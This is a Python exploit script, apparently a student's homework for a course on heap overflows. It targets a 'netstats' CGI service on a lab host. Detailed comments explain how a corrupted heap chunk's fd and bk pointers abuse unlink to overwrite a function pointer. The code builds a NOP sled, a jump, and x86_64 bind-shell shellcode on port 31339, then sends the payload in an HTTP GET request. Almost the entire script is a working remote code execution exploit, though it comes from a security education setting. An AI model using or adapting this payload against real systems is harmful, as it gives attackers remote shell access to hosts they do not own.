#!/usr/bin/env python

#Shawn Jones
#CSCI 461, HW4 - Heap Overflows

"""
Exploits a heap overflow in x86_64 ELF 'netstats'
Mitigation: strncpy in nonLinearRegression() should not use length of source
            as third parameter, but rather the length of destination
"""

#struct internalHeapChunk:
# ----offset 0                  <-----this is where the buffer starts
# 4-byte (prev_size)
# ----offset 4
# 4-byte (size)
# ----offset 8
# 8-byte (flag)
# ----offset 16
# 8-byte ptr (fd)
# ----offset 24
# 8-byte ptr (bk)
# ----offset 32                 <-----write no-op's until here, everything before here gets overwritten when free()'d
# 512-byte data                 ^-----this is address 0x603030
# ----offset 544 -- end of first chunk
#
# ----begin second chunk
# 4-byte (prev_size)
# ----offset 548
# 4-byte (size)
# ----offset 552
# 8-byte (flag)                 <-----set to 0x00000000deadbeef in little endian
# ----offset 560
# 8-byte ptr (fd)               <-----see note below
# ----offset 568
# 8-byte ptr (bk)               <-----see note below
# ----offset 576                <-----this is as far as we need to write



#displayStats function pointer is located @ 0x7fffffffdd18
#we know the program is going to call the function pointed to at that address
#so, we want to change the value located at that address to point to the shellcode @ 0x603030

#unlink does the following:
#
# *(secondChunk.fd + 24) = secondChunk.bk       <-- we want this to do *(0x00007fffffffdd18) = 0x0000000000603030
#                                               <-- so (secondChunk.fd + 24) needs to be == 0x00007fffffffdd18
#                                               <-- in other words, (secondChunk.fd) = 0x00007fffffffdd00
#
#                                               <-- now we know that whatever value is at bk will be written at 0x7fffffffdd18
#                                               <-- so we simply make (secondChunk.bk) = 0x0000000000603030
#
# *(secondChunk.bk + 16) = secondChunk.fd       <-- at this point we would be good to go, but
#                                               <-- then unlink does this, which is a small problem since it writes 8 bytes
#                                               <-- at 0x603050 (16 bytes after the start of our shellcode), and so we need
#                                               <-- to make the first instruction in our shellcode a jump-ahead by 24 bytes
#                                               <-- to skip over that

#summary:
#shellcode @ 0x603010 + 32 (freeinternalheapchunk corrupts first 32 bytes)
#total payload size should be 544+32  aka  size should be 576
#make n->flag == 0xdeadbeef
#make n->fd + 24 == 0x7fffffffdd18  aka   make n->fd == 0x7fffffffdd00
#make n->bk == 0x603010 + 32  aka  make n->bk == 0x603030

import socket, sys

def main(host = '192.168.56.2',
         port = 8002,
         resource = '/cgi-bin/stats.pl?opcode=3&statsfilename='):

    shellport = "\x7a\x6b"                   #31339
    shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"+shellport+"\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
         
    atk = "\x90"*32                          #all of first chunk's header
    atk += "\xeb\x20"                        #jump ahead 32 bytes
    while len(atk) < (544-len(shellcode)+8): #until nextchunk.flag
        atk += "\x90"
    atk += shellcode
    atk += "\xef\xbe\xad\xde"                #set flag
    atk += "\x00"*4                          #skip past extra 4 bytes of flag
    atk += "\x00\xdd\xff\xff\xff\x7f\x00\x00"   #set fd ptr
    atk += "\x30\x30\x60\x00\x00\x00\x00\x00"   #set bk ptr
    atk += "="                               #end of string character

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, port))

    s.send("GET " + resource + atk)

    while 1:
        buf = s.recv(1000)
        if not buf:
            break
        sys.stdout.write(buf)

    s.close()

if __name__ == '__main__':
    try:
        main()
    except RuntimeError, err:
        for s in err:
            print s
        raise RuntimeError(err)
